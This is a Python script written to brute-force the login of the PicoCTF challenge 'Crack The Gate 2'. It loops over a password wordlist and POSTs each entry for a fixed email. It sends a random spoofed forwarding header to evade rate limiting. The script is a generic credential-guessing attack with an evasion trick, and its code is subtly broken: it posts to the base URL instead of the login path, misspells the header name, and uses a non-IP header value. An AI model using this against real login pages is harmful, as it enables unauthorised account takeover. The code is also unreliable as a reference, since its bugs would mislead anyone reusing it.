#!/usr/bin/env python3

from termcolor import colored
from pathlib import Path
from pwn import *

import os, sys, time, random, requests, argparse

def checkout_hanlding(sig, frame):

    print(colored(f"{'-' * 30} Warning {'-' * 30}", 'red'))
    print(colored(f"\n\t[-] Sig: {sig}", 'yellow'))
    print(colored(f"\n\t[-] Frame: {frame}", 'blue'))
    print(colored("\n\t[!] Exiting....", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, checkout_hanlding)

def arguments():

    argu = argparse.ArgumentParser(description="Applying Brute Force to solve Crack The Gate 2 From PicoCTF")
    argu.add_argument('-t', '--target', dest='tsd', required=True, help="Write the url without '/login' -- EX: -t/--target http://idont_know.port:7070/")
    argu.add_argument('-w', '--word_list', dest='wordlist', required=True, help="Write the dictionary -- EX: -w/--word_list passwords.txt")

    return argu.parse_args()

def check_tag_and_word(target, word_list):

    print(colored(f"\n\t{'-' * 30} Checking Data {'-' * 30}", 'blue'))
    status_cd = 0
    
    try:
        response = requests.head(target, timeout=5)
        if (response.status_code == 200):
            print(colored(f"\n\n\t[+] Status Code: {response.status_code}", 'green'))
        else:
            print(colored(f"\n\n\t[!] Status Code: {response.status_code}", 'red'))
            status_cd += 1
    except Exception as e:
        print(colored(f"\n\n\t[!] The script could not stablish a connection to {target}\n\t[!] Error: {e}", 'red'))
        status_cd += 1
    finally:
        if os.path.exists(word_list):
            print(colored(f"\t[+] The file 'passwords.txt' exists", 'green'))
        else:
            print(colored(f"\n\t[!] You have to get the passwords.txt file", 'red'))
            status_cd += 1

    return status_cd

def brute_force(url, wordlist):

    print(colored(f"\n\n\t{'-' * 30} Providing Data {'-' * 30}", 'yellow'))
    main_url = f"{url}login"

    f = open(wordlist, 'r')

    bar = log.progress("Brute Forcing ")
    bar.status("[+] Starting ")

    for password in f.readlines():
        data = {
            "email":"ctf-player@picoctf.org",
            "password":password.strip()
        }

        bar.status(f"[-] Testing {data['password']}")

        headers = {
            "X-Forwarder-for": str(random.randint(1,100))
        }

        r = requests.post(url, json=data, headers=headers)

        if "false" not in r.text:
            bar.success(f"Password founded: {password.strip()}")
            break

def main():

    argumen = arguments()
    status = check_tag_and_word(argumen.tsd, argumen.wordlist)
    if (status == 0):
        brute_force(argumen.tsd, argumen.wordlist)
    else:
        print(colored(f"\n\n\t{'-' * 30} Warning {'-' * 30}", 'red'))
        print(colored("\n\n\t[!] The script could not start due to the url is not correct or you do not have the passwords.txt file", 'red'))

if __name__ == "__main__":

    main()
